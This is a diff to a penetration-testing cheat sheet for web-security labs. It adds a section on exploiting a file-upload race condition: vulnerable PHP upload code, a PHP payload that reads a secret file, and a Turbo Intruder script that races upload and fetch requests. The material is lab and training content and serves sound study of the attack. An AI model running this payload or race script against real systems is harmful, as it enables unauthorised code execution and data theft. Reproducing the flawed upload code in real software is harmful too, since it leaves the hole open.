@@ -2478,7 +2478,7 @@ Origin: http://subdomain.TARGET.NET
 [XXE SQLi inside XML + HackVertor](#sql--xml--hackvertor)  
 [XXE perform SSRF](#xxe--ssrf)  
 [XXE with SVG upload](#xxe-via-svg-image-upload)  
-[HackTheBox XML External Entity Injection](https://github.com/botesjuan/cpts-quick-references/blob/main/module/Web-Attacks.md#xxe)  
+[HackTheBox XML External Entity Injection - Private Github](https://github.com/botesjuan/cpts-quick-references/blob/main/module/Web-Attacks.md#xxe)  
   
 >File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.  
 
@@ -3161,6 +3161,7 @@ X-ProxyUser-Ip: 127.0.0.1
 [XXE via SVG Image upload](#xxe-via-svg-image-upload)  
 [Remote File Inclusion](#remote-file-inclusion)  
 [XSS SVG Upload](#xss-svg-upload)  
+[Race Condition Web shell upload](#race-condition-web-shell-upload)  
 [HackTheBox CPTS File Uploads](https://github.com/botesjuan/cpts-quick-references/blob/main/module/File%20Upload%20Attacks.md)
 
 ### Bypass Upload Controls  
@@ -3263,6 +3264,86 @@ csrf=u4r8fg90d7b09j4mm6k67m3&fileurl=http://localhost:6566/
    </script>
 </svg>
 ```  
+
+### Race Condition Web shell upload  
+
+>Image upload function ***identified*** on profile page.  
+
+>White box penetration test scenario, the vulnerable ***source code*** that introduces this race condition is supplied by the client for the target:  
+
+```php
+<?php
+$target_dir = "avatars/";
+$target_file = $target_dir . $_FILES["avatar"]["name"];
+
+// temporary move
+move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
+
+if (checkViruses($target_file) && checkFileType($target_file)) {
+    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
+} else {
+    unlink($target_file);
+    echo "Sorry, there was an error uploading your file.";
+    http_response_code(403);
+}
+
+function checkViruses($fileName) {
+    // checking for viruses
+    ...
+}
+
+function checkFileType($fileName) {
+    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
+    if($imageFileType != "jpg" && $imageFileType != "png") {
+        echo "Sorry, only JPG & PNG files are allowed\n";
+        return false;
+    } else {
+        return true;
+    }
+}
+?>
+```  
+
+>The uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete.  
+
+>PHP Payload to read the secret data `<?php echo file_get_contents('/home/carlos/secret'); ?>`  
+
+>Right-click on the failed upload `POST /my-account/avatar` request that was used to submit the PHP Payload file upload and select ***Extensions > Turbo Intruder > Send to turbo intruder.***
+>The Turbo Intruder window opens. Copy and paste the following race condition inducing script template into Turbo Intruder's Python editor:
+
+![race-condition-turbo-intruder](images/race-condition-turbo-intruder.png)  
+
+>Race script template into Turbo Intruder's Python editor:
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+
+    request1 = '''<YOUR-POST-REQUEST POST /my-account/avatar HTTP/2 filename="read-secret.php"'''
+
+    request2 = '''<YOUR-GET-REQUEST> GET /files/avatars/read-secret.php HTTP/2'''
+
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    engine.queue(request1, gate='race1')
+    for x in range(5):
+        engine.queue(request2, gate='race1')
+
+    # wait until every 'race1' tagged request is ready
+    # then send the final byte of each request
+    # (this method is non-blocking, just like queue)
+    engine.openGate('race1')
+
+    engine.complete(timeout=60)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```  
+
+>results list, notice that some of the GET requests received a 200 response containing Carlos's secret.  
+![race-condition-read-secret.png](images/race-condition-read-secret.png)  
+
+[PortSwigger Lab: Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)  
 
 -----
 
